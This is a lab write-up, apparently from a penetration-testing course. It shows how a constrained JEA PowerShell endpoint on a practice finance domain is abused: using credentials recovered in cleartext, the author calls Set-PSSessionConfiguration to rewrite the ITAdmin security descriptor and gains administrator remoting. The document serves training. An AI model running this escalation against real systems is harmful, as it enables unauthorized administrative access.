---
layout: default
---

## finance-vanessa.gcbfinance.local 192.168.42.14

The starting point of the finance section it's the previous lab with the extracted network credentials:
```
password=300YearsAndStillG0ing$trong
username=finance\vanessa
enpoint=ITAccess
```

The main idea of this lab is detect that the JEA access it's enable for this machine on the gcbfinance.local domain.

### 1. JEA feature detection for finance-vanessa.gcbfinance.local

From the it-employee15 attacker machine, we can try to access within PS sesson to the target machine with the previous credentials on cleartext:

```
PS C:\tools> $session=New-PSSession -ComputerName finance-vanessa.gcbfinance.local -Credential finance\vanessa
New-PSSession : [finance-vanessa.gcbfinance.local] Connecting to remote server finance-vanessa.gcbfinance.local failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.
At line:1 char:10
+ $session=New-PSSession -ComputerName finance-vanessa.gcbfinance.local ...
+          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.Manageme....RemoteRunspace:RemoteRunspace) [New-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : AccessDenied,PSSessionOpenFailed
```
Access with JEA endpoint configuration:

```
PS C:\tools> $session=New-PSSession -ComputerName finance-vanessa.gcbfinance.local -Credential finance\vanessa -ConfigurationName ITAccess
PS C:\tools> $session

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  3 WinRM3          finance-vane... RemoteMachine   Opened        ITAccess                 Available

```

Review enpoint confguration and capabilities:

```
PS C:\tools> Invoke-Command -Session $session { Get-PSSessionConfiguration -Name '*' }


Name           : ITAccess
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : FINANCE\vanessa AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : ITAdmin
PSVersion      : 5.1
StartupScript  :
RunAsUser      : finance\vanessa-admin
Permission     : BUILTIN\Administrators AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : microsoft.powershell
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : microsoft.powershell.workflow
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : microsoft.powershell32
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed, BUILTIN\Remote Management Users AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : microsoft.windows.servermanagerworkflows
PSVersion      : 3.0
StartupScript  :
RunAsUser      :
Permission     : NT AUTHORITY\INTERACTIVE AccessAllowed, BUILTIN\Administrators AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local
```

Capabilities:

ITAccess:

```

PS C:\tools> Invoke-Command -Session $session { Get-PSSessionCapability  -UserName 'vanessa' -ConfigurationName 'ITAccess' }

CommandType     Name                                               Version    Source                                                                                           PSComputerName
-----------     ----                                               -------    ------                                                                                           --------------
Alias           clear -> Clear-Host                                                                                                                                            finance-vanessa.gcbfinance.local
Alias           cls -> Clear-Host                                                                                                                                              finance-vanessa.gcbfinance.local
Alias           exsn -> Exit-PSSession                                                                                                                                         finance-vanessa.gcbfinance.local
Alias           gcm -> Get-Command                                                                                                                                             finance-vanessa.gcbfinance.local
Alias           measure -> Measure-Object                                                                                                                                      finance-vanessa.gcbfinance.local
Alias           select -> Select-Object                                                                                                                                        finance-vanessa.gcbfinance.local
Function        Clear-Host                                                                                                                                                     finance-vanessa.gcbfinance.local
Function        Exit-PSSession                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Get-Command                                                                                                                                                    finance-vanessa.gcbfinance.local
Function        Get-FormatData                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Get-Help                                                                                                                                                       finance-vanessa.gcbfinance.local
Function        Get-PSSessionCapability                                                                                                                                        finance-vanessa.gcbfinance.local
Function        Get-PSSessionConfiguration                                                                                                                                     finance-vanessa.gcbfinance.local
Function        Measure-Object                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Out-Default                                                                                                                                                    finance-vanessa.gcbfinance.local
Function        Select-Object                                                                                                                                                  finance-vanessa.gcbfinance.local
Function        Set-PSSessionConfiguration                                                                                                                                     finance-vanessa.gcbfinance.local
Function        Start-Process                                                                                                                                                  finance-vanessa.gcbfinance.local




```


ITAdmin:
```
PS C:\tools> Invoke-Command -Session $session { Get-PSSessionCapability  -UserName 'vanessa' -ConfigurationName 'ITAdmin' }

CommandType     Name                                               Version    Source                                                                                           PSComputerName
-----------     ----                                               -------    ------                                                                                           --------------
Alias           clear -> Clear-Host                                                                                                                                            finance-vanessa.gcbfinance.local
Alias           cls -> Clear-Host                                                                                                                                              finance-vanessa.gcbfinance.local
Alias           exsn -> Exit-PSSession                                                                                                                                         finance-vanessa.gcbfinance.local
Alias           gcm -> Get-Command                                                                                                                                             finance-vanessa.gcbfinance.local
Alias           measure -> Measure-Object                                                                                                                                      finance-vanessa.gcbfinance.local
Alias           select -> Select-Object                                                                                                                                        finance-vanessa.gcbfinance.local
Function        Clear-Host                                                                                                                                                     finance-vanessa.gcbfinance.local
Function        Exit-PSSession                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Get-Command                                                                                                                                                    finance-vanessa.gcbfinance.local
Function        Get-FormatData                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Get-Help                                                                                                                                                       finance-vanessa.gcbfinance.local
Function        Measure-Object                                                                                                                                                 finance-vanessa.gcbfinance.local
Function        Out-Default                                                                                                                                                    finance-vanessa.gcbfinance.local
Function        Select-Object                                                                                                                                                  finance-vanessa.gcbfinance.local
```

It's requered abuse of the ITAccess configuration in order to grant vanessa-admin capabilities to the vanessa user access.




### 2. JEA abusse 

Modify JEA permissions of ITAdmin from ITAccess session with the SID of our user: S-1-5-21-948911695-1962824894-4291460450-27607

```
PS C:\tools> Invoke-Command -Session $session {Set-PSSessionConfiguration -Name ITAdmin -SecurityDescriptorSddl 'O:NSG:BAD:P(A;;GA;;;BA)(A;;GAGR;;;S-1-5-21-948911695-1962824894-4291460450-27607)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)'}
WARNING: Set-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
```

### 3. Access to finance-vanessa.gcbfinance.local with itemployee15 user and ITAdmin configuration

With thre previous change the IT user trusted domain itemployee15 is allowed to access such administrator to the target machine:

```
PS C:\Users\itemployee15> Invoke-Command -Session $session { Get-PSSessionConfiguration -Name '*' }


Name           : ITAccess
PSVersion      : 5.1
StartupScript  :
RunAsUser      :
Permission     : FINANCE\vanessa AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local

Name           : ITAdmin
PSVersion      : 5.1
StartupScript  :
RunAsUser      : finance\vanessa-admin
Permission     : BUILTIN\Administrators AccessAllowed, IT\itemployee15 AccessAllowed
PSComputerName : finance-vanessa.gcbfinance.local
```


with it\itemployee15 user access to finance-vanessa with ITAdmin configuration:

```
[finance-vanessa.gcbfinance.local]: PS C:\Windows\system32> Get-PSSessionCapability  -UserName 'it\itemployee15' -ConfigurationName 'ITAdmin'

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           clear -> Clear-Host
Alias           cls -> Clear-Host
Alias           exsn -> Exit-PSSession
Alias           gcm -> Get-Command
Alias           measure -> Measure-Object
Alias           select -> Select-Object
Function        A:
Function        B:
Function        C:
Function        cd..
Function        cd\
Function        Clear-Host
Function        D:
Function        E:
Function        Exit-PSSession
Function        F:
Function        G:
Function        Get-Command
Function        Get-FormatData
Function        Get-Help
Function        Get-Verb
Function        H:
Function        help
Function        I:
Function        ImportSystemModules
Function        J:
Function        K:
Function        L:
Function        M:
Function        Measure-Object
Function        mkdir
Function        more
Function        N:
Function        O:
Function        oss
Function        Out-Default
Function        P:
Function        Pause
Function        prompt
Function        Q:
Function        R:
Function        S:
Function        Select-Object
Function        T:
Function        TabExpansion2
Function        U:
Function        V:
Function        W:
Function        X:
Function        Y:
Function        Z:
Cmdlet          Add-Computer                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Add-Content                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Add-History                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Add-Member                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Add-PSSnapin                                       3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Add-Type                                           3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Checkpoint-Computer                                3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-Content                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-EventLog                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-History                                      3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Clear-Item                                         3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-ItemProperty                                 3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-RecycleBin                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Clear-Variable                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Compare-Object                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Complete-Transaction                               3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Connect-PSSession                                  3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Connect-WSMan                                      3.0.0.0    Microsoft.WSMan.Management
Cmdlet          ConvertFrom-Csv                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertFrom-Json                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertFrom-SecureString                           3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          ConvertFrom-String                                 3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertFrom-StringData                             3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Convert-Path                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Convert-String                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertTo-Csv                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertTo-Html                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertTo-Json                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ConvertTo-SecureString                             3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          ConvertTo-Xml                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Copy-Item                                          3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Copy-ItemProperty                                  3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Debug-Job                                          3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Debug-Process                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Debug-Runspace                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Disable-ComputerRestore                            3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Disable-PSBreakpoint                               3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Disable-PSRemoting                                 3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Disable-PSSessionConfiguration                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Disable-RunspaceDebug                              3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Disable-WSManCredSSP                               3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Disconnect-PSSession                               3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Disconnect-WSMan                                   3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Enable-ComputerRestore                             3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Enable-PSBreakpoint                                3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Enable-PSRemoting                                  3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Enable-PSSessionConfiguration                      3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Enable-RunspaceDebug                               3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Enable-WSManCredSSP                                3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Enter-PSHostProcess                                3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Enter-PSSession                                    3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Exit-PSHostProcess                                 3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Exit-PSSession                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Export-Alias                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Export-Clixml                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Export-Console                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Export-Counter                                     3.0.0.0    Microsoft.PowerShell.Diagnostics
Cmdlet          Export-Csv                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Export-FormatData                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Export-ModuleMember                                3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Export-PSSession                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          ForEach-Object                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Format-Custom                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Format-List                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Format-Table                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Format-Wide                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-Alias                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-AuthenticodeSignature                          3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-ChildItem                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Clipboard                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-CmsMessage                                     3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-Command                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-ComputerInfo                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-ComputerRestorePoint                           3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Content                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-ControlPanelItem                               3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Counter                                        3.0.0.0    Microsoft.PowerShell.Diagnostics
Cmdlet          Get-Credential                                     3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-Culture                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Date                                           3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Event                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-EventLog                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-EventSubscriber                                3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-ExecutionPolicy                                3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-FormatData                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Help                                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-History                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-Host                                           3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-HotFix                                         3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Item                                           3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-ItemProperty                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-ItemPropertyValue                              3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Job                                            3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-Location                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-Member                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Module                                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-PfxCertificate                                 3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Get-Process                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-PSBreakpoint                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-PSCallStack                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-PSDrive                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-PSHostProcessInfo                              3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-PSProvider                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-PSSession                                      3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-PSSessionCapability                            3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-PSSessionConfiguration                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-PSSnapin                                       3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Get-Random                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Runspace                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-RunspaceDebug                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Service                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-TimeZone                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-TraceSource                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Transaction                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-TypeData                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-UICulture                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Unique                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-Variable                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Get-WinEvent                                       3.0.0.0    Microsoft.PowerShell.Diagnostics
Cmdlet          Get-WmiObject                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Get-WSManCredSSP                                   3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Get-WSManInstance                                  3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Group-Object                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Import-Alias                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Import-Clixml                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Import-Counter                                     3.0.0.0    Microsoft.PowerShell.Diagnostics
Cmdlet          Import-Csv                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Import-LocalizedData                               3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Import-PSSession                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Invoke-Command                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Invoke-Expression                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Invoke-History                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Invoke-Item                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Invoke-RestMethod                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Invoke-WebRequest                                  3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Invoke-WmiMethod                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Invoke-WSManAction                                 3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Join-Path                                          3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Limit-EventLog                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Measure-Command                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Measure-Object                                     3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Move-Item                                          3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Move-ItemProperty                                  3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-Alias                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          New-Event                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          New-EventLog                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-FileCatalog                                    3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          New-Item                                           3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-ItemProperty                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-Module                                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-ModuleManifest                                 3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-Object                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          New-PSDrive                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-PSRoleCapabilityFile                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-PSSession                                      3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-PSSessionConfigurationFile                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-PSSessionOption                                3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-PSTransportOption                              3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          New-Service                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-TimeSpan                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          New-Variable                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          New-WebServiceProxy                                3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          New-WinEvent                                       3.0.0.0    Microsoft.PowerShell.Diagnostics
Cmdlet          New-WSManInstance                                  3.0.0.0    Microsoft.WSMan.Management
Cmdlet          New-WSManSessionOption                             3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Out-Default                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Out-File                                           3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Out-GridView                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Out-Host                                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Out-Null                                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Out-Printer                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Out-String                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Pop-Location                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Protect-CmsMessage                                 3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Push-Location                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Read-Host                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Receive-Job                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Receive-PSSession                                  3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Register-ArgumentCompleter                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Register-EngineEvent                               3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Register-ObjectEvent                               3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Register-PSSessionConfiguration                    3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Register-WmiEvent                                  3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-Computer                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-Event                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Remove-EventLog                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-Item                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-ItemProperty                                3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-Job                                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Remove-Module                                      3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Remove-PSBreakpoint                                3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Remove-PSDrive                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-PSSession                                   3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Remove-PSSnapin                                    3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Remove-TypeData                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Remove-Variable                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Remove-WmiObject                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Remove-WSManInstance                               3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Rename-Computer                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Rename-Item                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Rename-ItemProperty                                3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Reset-ComputerMachinePassword                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Resolve-Path                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Restart-Computer                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Restart-Service                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Restore-Computer                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Resume-Job                                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Resume-Service                                     3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Save-Help                                          3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Select-Object                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Select-String                                      3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Select-Xml                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Send-MailMessage                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-Acl                                            3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Set-Alias                                          3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-AuthenticodeSignature                          3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Set-Clipboard                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-Content                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-Date                                           3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-ExecutionPolicy                                3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Set-Item                                           3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-ItemProperty                                   3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-Location                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-PSBreakpoint                                   3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-PSDebug                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Set-PSSessionConfiguration                         3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Set-Service                                        3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-StrictMode                                     3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Set-TimeZone                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-TraceSource                                    3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-Variable                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Set-WmiInstance                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Set-WSManInstance                                  3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Set-WSManQuickConfig                               3.0.0.0    Microsoft.WSMan.Management
Cmdlet          Show-Command                                       3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Show-ControlPanelItem                              3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Show-EventLog                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Sort-Object                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Split-Path                                         3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Start-Job                                          3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Start-Process                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Start-Service                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Start-Sleep                                        3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Start-Transaction                                  3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Start-Transcript                                   3.0.0.0    Microsoft.PowerShell.Host
Cmdlet          Stop-Computer                                      3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Stop-Job                                           3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Stop-Process                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Stop-Service                                       3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Stop-Transcript                                    3.0.0.0    Microsoft.PowerShell.Host
Cmdlet          Suspend-Job                                        3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Suspend-Service                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Tee-Object                                         3.0.0.0    Microsoft.PowerShell.Utility
Cmdlet          Test-ComputerSecureChannel                         3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Test-Connection                                    3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Test-FileCatalog                                   3.0.0.0    Microsoft.PowerShell.Security
Cmdlet          Test-ModuleManifest                                3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Test-Path                                          3.0.0.0    Microsoft.PowerShell.Management
Cmdlet          Test-PSSessionConfigurationFile                    3.0.0.0    Microsoft.PowerShell.Core
Cmdlet          Test-WSMan                                         3.0.0.0    Microsoft.WSMan.Management
